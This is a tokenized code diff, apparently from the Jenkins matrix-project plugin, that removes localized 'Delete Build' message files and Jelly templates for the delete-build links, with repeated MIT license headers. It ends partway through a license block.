"included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "cannotMsg", "=", "N", "\\", "u00e3o", "foi", "poss", "\\", "u00edvel", "remover", "esse", "build", ":", "{", "0", "}", "Are", "\\", "you", "\\", "sure", "\\", "about", "\\", "deleting", "\\", "the", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "?", "=", "Tem", "certeza", "que", "deseja", "remover", "esse", "build", "e", "todas", "suas", "configura", "\\", "u00e7", "\\", "u00f5es", "?", "Yes", "=", "Sim", "Warning", "=", "Aviso", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Are", "\\", "you", "\\", "sure", "\\", "about", "\\", "deleting", "\\", "the", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "?", "=\\", "u0412", "\\", "u044B", "\\", "u0443", "\\", "u0432", "\\", "u0435", "\\", "u0440", "\\", "u0435", "\\", "u043D", "\\", "u044B", ",", "\\", "u0447", "\\", "u0442", "\\", "u043E", "\\", "u0445", "\\", "u043E", "\\", "u0442", "\\", "u0438", "\\", "u0442", "\\", "u0435", "\\", "u0443", "\\", "u0434", "\\", "u0430", "\\", "u043B", "\\", "u0438", "\\", "u0442", "\\", "u044C", "\\", "u0441", "\\", "u0431", "\\", "u043E", "\\", "u0440", "\\", "u043A", "\\", "u0443", "\\", "u0438", "\\", "u0432", "\\", "u0441", "\\", "u0435", "\\", "u043A", "\\", "u043E", "\\", "u043D", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0438", "\\", "u0438", "?", "Yes", "=", "\\", "u0414", "\\", "u0430", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Warning", "=", "\\", "u8b66", "\\", "u544a", "Are", "\\", "you", "\\", "sure", "\\", "about", "\\", "deleting", "\\", "the", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "?", "=\\", "u60a8", "\\", "u78ba", "\\", "u5b9a", "\\", "u8981", "\\", "u522a", "\\", "u9664", "\\", "u5efa", "\\", "u7f6e", "\\", "u8ddf", "\\", "u5b83", "\\", "u6240", "\\", "u6709", "\\", "u7684", "\\", "u8a2d", "\\", "u5b9a", "\\", "u55ce", "?", "Yes", "=", "\\", "u662f", "@", "@", "-", "1", ",", "34", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Ullrich", "Hafner", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "!", "Displays", "the", "links", "to", "delete", "the", "build", ".", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", ">", "<", "j", ":", "if", "test", "=", "\"$", "{!", "it", ".", "building", "}", "\">", "<", "l", ":", "task", "icon", "=", "\"", "images", "/", "24x24", "/", "edit", "-", "delete", ".", "png", "\"", "href", "=", "\"$", "{", "buildUrl", ".", "baseUrl", "}", "/", "confirmDelete", "\"", "title", "=", "\"$", "{%", "Delete", "Build", "}", "\"", "permission", "=", "\"$", "{", "it", ".", "DELETE", "}", "\"", "/", ">", "<", "l", ":", "task", "icon", "=", "\"", "images", "/", "24x24", "/", "edit", "-", "delete", ".", "png", "\"", "href", "=", "\"$", "{", "buildUrl", ".", "baseUrl", "}", "/", "confirmDeleteAll", "\"", "title", "=", "\"$", "{%", "Delete", "this", "build", "and", "all", "configurations", "in", "this", "build", "}", "\"", "permission", "=", "\"$", "{", "it", ".", "DELETE", "}", "\"", "/", ">", "<", "/", "j", ":", "if", ">", "<", "/", "j", ":", "jelly", ">", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Delete", "\\", "Build", "=", "Eliminar", "Build", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Delete", "\\", "Build", "=", "Smazat", "sestaven", "\\", "u00ED", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "Smazat", "sestaven", "\\", "u00ED", "a", "v", "\\", "u0161echna", "jeho", "nastaven", "\\", "u00ED", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2012", ",", "Frederic", "Gurr", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Delete", "\\", "Build", "=", "Build", "l", "\ufffd", "schen", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "Build", "und", "alle", "Konfigurationen", "dieses", "Builds", "l", "\ufffd", "schen", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Delete", "\\", "Build", "=", "Borrar", "esta", "ejecuci", "\ufffd", "n", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "Borrar", "esta", "ejecuci", "\ufffd", "n", "y", "todas", "sus", "configuraciones", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2012", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Delete", "\\", "Build", "=", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u3092", "\\", "u524a", "\\", "u9664", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "\\", "\\", "u30d3", "\\", "u30eb", "\\", "u30c9", "\\", "u3068", "\\", "u8a2d", "\\", "u5b9a", "\\", "u3092", "\\", "u524a", "\\", "u9664", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Delete", "\\", "Build", "=", "\\", "uBE4C", "\\", "uB4DC", "\\", "uC0AD", "\\", "uC81C", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "\\", "uC774", "\\", "uBE4C", "\\", "uB4DC", "\\", "uC640", "\\", "uBAA8", "\\", "uB4E0", "\\", "uAD6C", "\\", "uC131", "\\", "uC758", "\\", "uBE4C", "\\", "uB4DC", "\\", "uB4E4", "\\", "uC744", "\\", "uC0AD", "\\", "uC81C", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Delete", "\\", "Build", "=", "Usu", "\\", "u0144", "build", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "Usu", "\\", "u0144", "ten", "build", "i", "wszystkie", "konfiguracje", "w", "nim", "@", "@", "-", "1", ",", "25", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Delete", "\\", "Build", "=", "Remover", "build", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "Remover", "esse", "build", "e", "todas", "suas", "configura", "\\", "u00e7", "\\", "u00f5es", "@", "@", "-", "1", ",", "5", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "#", "Translated", "by", ":", "Fernando", "Boaglio", "Delete", "\\", "Build", "=", "Remover", "este", "build", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "Remover", "este", "build", "e", "todas", "as", "suas", "configura", "\\", "u00E7", "\\", "u00F5es", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Delete", "\\", "Build", "=", "\\", "u0423", "\\", "u0434", "\\", "u0430", "\\", "u043B", "\\", "u0438", "\\", "u0442", "\\", "u044C", "\\", "u0441", "\\", "u0431", "\\", "u043E", "\\", "u0440", "\\", "u043A", "\\", "u0443", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "\\", "u0423", "\\", "u0434", "\\", "u0430", "\\", "u043B", "\\", "u0438", "\\", "u0442", "\\", "u044C", "\\", "u044D", "\\", "u0442", "\\", "u0443", "\\", "u0441", "\\", "u0431", "\\", "u043E", "\\", "u0440", "\\", "u043A", "\\", "u0443", "\\", "u0432", "\\", "u043C", "\\", "u0435", "\\", "u0441", "\\", "u0442", "\\", "u0435", "\\", "u0441", "\\", "u043E", "\\", "u0432", "\\", "u0441", "\\", "u0435", "\\", "u043C", "\\", "u0438", "\\", "u0435", "\\", "u0435", "\\", "u043A", "\\", "u043E", "\\", "u043D", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0438", "\\", "u044F", "\\", "u043C", "\\", "u0438", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Delete", "\\", "Build", "=", "\\", "u5220", "\\", "u9664", "\\", "u6784", "\\", "u5EFA", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "\\", "u5220", "\\", "u9664", "\\", "u6784", "\\", "u5EFA", "\\", "u53CA", "\\", "u5176", "\\", "u914D", "\\", "u7F6E", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Delete", "\\", "Build", "=", "\\", "u522a", "\\", "u9664", "\\", "u5efa", "\\", "u7f6e", "Delete", "\\", "this", "\\", "build", "\\", "and", "\\", "all", "\\", "configurations", "\\", "in", "\\", "this", "\\", "build", "=", "\\", "u522a", "\\", "u9664", "\\", "u5efa", "\\", "u7f6e", "\\", "u8ddf", "\\", "u5b83", "\\", "u6240", "\\", "u6709", "\\", "u7684", "\\", "u8a2d", "\\", "u5b9a", "@", "@", "-", "1", ",", "28", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "st", ":", "include", "page", "=", "\"", "ajaxMatrix", ".", "jelly", "\"", "/", ">", "<", "/", "j", ":", "jelly", ">", "/", "/", "default", "is", "empty", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", 